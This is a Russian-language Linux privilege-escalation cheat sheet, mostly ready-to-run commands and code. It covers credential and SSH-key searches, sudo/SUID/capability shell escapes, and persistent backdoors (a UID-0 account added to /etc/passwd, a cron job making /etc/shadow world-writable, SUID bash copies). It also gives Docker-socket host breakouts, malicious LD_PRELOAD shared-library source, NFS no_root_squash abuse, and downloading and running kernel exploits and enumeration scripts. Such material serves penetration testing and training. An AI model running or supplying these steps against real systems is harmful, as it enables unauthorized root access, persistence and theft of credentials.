# 🐧 Linux Privilege Escalation Cheat Sheet

**Полное руководство по повышению привилегий в Linux-системах.**  
Включает техники для SUID, Capabilities, Cron, Docker Breakout, Sudo, Kernel Exploits и многое другое.

---

## 📚 Оглавление
1. [Базовая разведка](#-базовая-разведка)
2. [Sudo Привилегии](#-sudo-привилегии)
3. [SUID и SGID Бинари](#-suid-и-sgid-бинари)
4. [Linux Capabilities](#-linux-capabilities)
5. [Cron Задания](#-cron-задания)
6. [Docker Breakout](#-docker-breakout)
7. [Kernel Exploits](#-kernel-exploits)
8. [LD_PRELOAD / LD_LIBRARY_PATH](#-ld_preload--ld_library_path)
9. [NFS (Network File System)](#-nfs-network-file-system)
10. [Полезные инструменты](#-полезные-инструменты)

---

## 🔍 Базовая разведка

### 1.1 Сбор информации о системе

```bash
# Информация о ядре и ОС
uname -a
cat /etc/os-release
lsb_release -a

# Информация о пользователе
id
whoami
groups
sudo -l

# Информация о процессах
ps aux
ps aux | grep root
ps -ef --forest

# Сетевая информация
ip a
ss -tlnp
netstat -tulpn
route -n
arp -a

# Информация о файловой системе
df -h
mount
lsblk
findmnt

1.2 Поиск конфиденциальных файлов
# Поиск файлов с паролями
find / -name "*.conf" -type f 2>/dev/null | xargs grep -i "password" 2>/dev/null
find / -name "*.ini" -type f 2>/dev/null | xargs grep -i "pass" 2>/dev/null
find / -name ".bash_history" -type f 2>/dev/null

# Поиск SSH ключей
find / -name "id_rsa" -type f 2>/dev/null
find / -name "id_dsa" -type f 2>/dev/null
find / -name "*.pem" -type f 2>/dev/null

# Поиск файлов с правами на запись
find / -writable -type f 2>/dev/null | grep -v "/proc/"
find / -perm -222 -type f 2>/dev/null
find / -perm -o w -type f 2>/dev/null

 Sudo Привилегии
2.1 Проверка sudo прав
# Какие команды может выполнять пользователь
sudo -l

# Если требует пароль, можно попробовать брутфорс
# hydra -l user -P wordlist.txt ssh://target

2.2 Эксплуатация Sudo (GTFOBins)
Команда	Эксплуатация	Описание
sudo vim	:!/bin/sh	Открыть шелл из Vim
sudo find	sudo find . -exec /bin/sh \; -quit	Выполнить шелл через find
sudo awk	sudo awk 'BEGIN {system("/bin/sh")}'	Выполнить шелл через awk
sudo python	sudo python -c 'import pty;pty.spawn("/bin/bash")'	Python шелл
sudo less	!/bin/sh	Шелл из less
sudo git	sudo git help config → !/bin/bash	Шелл через git help
sudo tar	sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh	Шелл через tar

2.3 Обход ограничений
# Если запрещены некоторые команды, но разрешен sudoedit
sudoedit /etc/passwd
# Добавляем пользователя с UID 0
echo "backdoor:x:0:0:root:/root:/bin/bash" >> /etc/passwd

# Обход через env_keep
sudo -l
# Если видим SETENV: или env_keep+=LD_PRELOAD
sudo LD_PRELOAD=/tmp/evil.so vim

SUID и SGID Бинари
3.1 Поиск SUID/SGID бинарных файлов
# Поиск SUID файлов
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Поиск SGID файлов
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Поиск SUID/SGID вместе
find / -perm -6000 -type f 2>/dev/null

3.2 Эксплуатация известных SUID бинарных файлов (GTFOBins)
Бинарный файл	Команда для шелла
nmap	nmap --interactive → !sh
find	find . -exec /bin/sh \; -quit
bash	bash -p
vim	vim -c ':!/bin/sh'
python	python -c 'import os;os.setuid(0);os.system("/bin/sh")'
cp	cp /etc/shadow /tmp/shadow (копирование файлов)
mv	Перемещение теневого файла
chmod	Изменение прав на файлы
awk	awk 'BEGIN {system("/bin/sh")}'
perl	perl -e 'setuid(0); system("/bin/sh")'
php	php -r 'posix_setuid(0); system("/bin/sh");'

3.3 Создание SUID бэкдора
# Копирование /bin/bash с SUID
cp /bin/bash /tmp/bash
chmod 4755 /tmp/bash
/tmp/bash -p

# Использование python для создания SUID шелла
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

 Linux Capabilities
4.1 Поиск бинарных файлов с Capabilities
# Поиск всех файлов с capabilities
getcap -r / 2>/dev/null
find / -type f -exec getcap {} \; 2>/dev/null

4.2 Эксплуатация известных Capabilities
Capability	Эксплуатация	Описание
cap_dac_read_search	python -c 'import os; os.setuid(0); os.system("/bin/bash")'	Чтение любых файлов
cap_dac_override	Перезапись /etc/passwd или /etc/shadow	Обход прав доступа
cap_setuid	python -c 'import os; os.setuid(0); os.system("/bin/bash")'	Установка UID
cap_net_raw	ARP спуфинг, сниффинг трафика	Работа с сырыми сокетами
cap_sys_admin	Монтирование файловых систем	Администрирование
cap_sys_ptrace	Инъекция в процессы	Отладка процессов

4.3 Примеры эксплуатации
# Если python имеет cap_setuid
getcap /usr/bin/python3
# /usr/bin/python3 = cap_setuid+ep

python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Если vim имеет cap_dac_read_search
getcap /usr/bin/vim
# /usr/bin/vim = cap_dac_read_search+ep

vim /etc/shadow  # Читаем любой файл

# Если tar имеет cap_dac_override
tar -cf archive.tar /etc/shadow  # Упаковываем любой файл

Cron Задания
5.1 Поиск cron заданий
# Просмотр системных cron заданий
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Просмотр пользовательских cron
crontab -l

# Поиск скриптов запускаемых по cron
find / -name "*.sh" -path "*/cron*" 2>/dev/null

5.2 Эксплуатация cron заданий
# 1. Если скрипт перезаписываемый
echo '#!/bin/bash' > /path/to/script.sh
echo 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' >> /path/to/script.sh

# 2. Если скрипт запускается от root, но мы можем писать в папку
# Добавляем свой скрипт
echo '#!/bin/bash' > /etc/cron.d/backdoor
echo '* * * * * root chmod 777 /etc/shadow' >> /etc/cron.d/backdoor

# 3. Использование wildcard в cron
# Если cron запускает tar -czf /backup.tar.gz * в папке, где есть файлы:
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
echo '#!/bin/bash' > shell.sh
echo 'cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash' >> shell.sh

5.3 Поиск записываемых cron скриптов
# Найти скрипты, которые может редактировать текущий пользователь
find /etc/cron* -type f -writable 2>/dev/null
find /etc/cron* -type f -user $(whoami) 2>/dev/null

Docker Breakout
6.1 Проверка нахождения в Docker контейнере
# Индикаторы Docker
ls -la /.dockerenv 2>/dev/null
cat /proc/1/cgroup | grep -i docker
mount | grep -i docker
df -h | grep -i overlay

6.2 Эксплуатация Docker привилегий
# Если пользователь в группе docker
docker images
docker run -it -v /:/host alpine chroot /host /bin/bash

# Получение шелла на хосте
docker run -it --privileged --pid=host ubuntu nsenter -t 1 -m -u -i -n sh

# Монтирование хостовой файловой системы
docker run -it -v /:/mnt ubuntu chroot /mnt /bin/bash

# Использование сокета Docker
curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock http://localhost/containers/create -d '{"Image":"ubuntu","Cmd":["/bin/bash"],"HostConfig":{"Binds":["/:/mnt"]}}'

6.3 Эксплуатация Docker через привилегированный режим
# Запуск контейнера с привилегиями
docker run -it --privileged ubuntu bash

# Внутри контейнера: доступ к /dev
fdisk -l
mount /dev/sda1 /mnt
chroot /mnt /bin/bash

# Чтение файлов хоста
cat /proc/1/mountinfo
cat /proc/1/cwd/etc/shadow

6.4 Docker Socket эксплуатация
# Если монтирован docker.sock
# Найти его: find / -name docker.sock 2>/dev/null

# Создание нового контейнера с привилегиями
docker run -it -v /:/host --privileged ubuntu chroot /host /bin/bash

# Использование curl с docker.sock
curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/create -d '{"Image":"ubuntu","Cmd":["/bin/bash"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'

Kernel Exploits
7.1 Проверка версии ядра
uname -a
cat /proc/version
cat /etc/issue

7.2 Поиск эксплойтов
# Использование searchsploit
searchsploit linux kernel <version>
searchsploit -t linux | grep -i "privilege escalation"

# Автоматические скрипты
# Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

7.3 Популярные kernel эксплойты
Эксплойт	Версия ядра	Описание
Dirty Cow (CVE-2016-5195)	2.6.22 - 4.8.3	Гонка потоков для перезаписи памяти
CVE-2021-3156	Sudo 1.8.2 - 1.8.31	Heap-based buffer overflow
CVE-2017-16995	4.4.0-116	BPF эксплуатация
CVE-2022-0847 (Dirty Pipe)	5.8 - 5.16	Перезапись файлов

7.4 Использование эксплойтов
# Пример с Dirty Cow
gcc -pthread dirtycow.c -o dirtycow
./dirtycow /etc/passwd

# Пример с CVE-2021-3156
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich

LD_PRELOAD / LD_LIBRARY_PATH
8.1 Обнаружение
# Проверка переменных окружения
env | grep -i ld
echo $LD_PRELOAD
echo $LD_LIBRARY_PATH

# Проверка sudo на предмет env_keep
sudo -l | grep -i env

8.2 Эксплуатация LD_PRELOAD
// evil.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
# Компиляция
gcc -fPIC -shared -o evil.so evil.c -nostartfiles

# Использование
sudo LD_PRELOAD=./evil.so <программа_в_списке_sudo>

8.3 Эксплуатация LD_LIBRARY_PATH
// libc.c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
void __attribute__((constructor)) init() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
# Компиляция
gcc -fPIC -shared -o libc.so.6 libc.c

# Использование
sudo LD_LIBRARY_PATH=. <программа>

NFS (Network File System)
9.1 Проверка NFS
# Проверка экспортированных шаров
showmount -e localhost
cat /etc/exports

# Монтирование шара на локальную машину
mkdir /tmp/nfs
mount -o rw,noexec,nosuid <target>:/exported /tmp/nfs

9.2 Эксплуатация NFS
# Если шар смонтирован с no_root_squash
# Создаем SUID файл на шаре
echo 'int main(){setuid(0); system("/bin/bash");}' > /tmp/nfs/suid.c
gcc /tmp/nfs/suid.c -o /tmp/nfs/suid
chmod 4755 /tmp/nfs/suid

# Выполняем на целевой системе
./suid

Полезные инструменты
Инструмент	Назначение
LinPEAS	Автоматический скрипт для поиска векторов привилегий
Linux Exploit Suggester	Поиск эксплойтов для ядра
GTFOBins	База данных по эксплуатации Unix бинарных файлов
pspy	Мониторинг процессов без прав root
pwnkit	Эксплойт для CVE-2021-4034 (Polkit)
suid3num	Поиск SUID бинарных файлов
📚 Источники и дополнительная литература
GTFOBins

LinPEAS

Linux Kernel Exploits

PayloadsAllTheThings — Linux PrivEsc
